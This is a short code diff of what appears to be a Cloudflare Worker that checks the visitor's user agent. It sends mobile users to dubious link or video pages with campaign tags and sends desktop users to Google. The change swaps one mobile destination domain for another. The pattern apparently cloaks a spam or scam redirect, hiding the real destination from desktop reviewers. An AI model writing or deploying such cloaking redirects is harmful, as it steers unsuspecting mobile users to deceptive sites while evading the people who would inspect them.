@@ -32,7 +32,7 @@ https://crimson-frost-97c6.samuelgill0316.workers.dev/">
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://nmnreels.top/bxitry/video.mp4?utm_source=STOCK&utm_medium=Sh", 302);
+    return Response.redirect("https://super-video.link24xx.com/links.html?utm_source=suny&utm_medium=suny5", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
